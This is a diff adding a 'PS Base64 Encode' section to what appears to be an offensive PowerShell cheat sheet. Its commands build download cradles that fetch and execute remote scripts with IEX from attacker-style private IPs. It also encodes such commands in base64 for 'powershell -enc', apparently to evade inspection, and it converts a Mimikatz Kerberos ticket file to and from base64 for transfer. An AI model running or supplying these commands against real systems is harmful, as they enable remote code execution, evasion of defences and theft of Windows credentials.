@@ -48,3 +48,16 @@ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.99.110/shell
 powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
 
 ```
+### PS Base64 Encode
+```
+$OriginalCommand = '#{powershell_command}'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
+$EncodedCommand =[Convert]::ToBase64String($Bytes)
+$EncodedCommand
+$OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0.166:80/download/file.ps1')"
+[System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
+```
+```
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi"))
+[System.IO.File]::WriteAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi", [System.Convert]::FromBase64String("do"))
+```
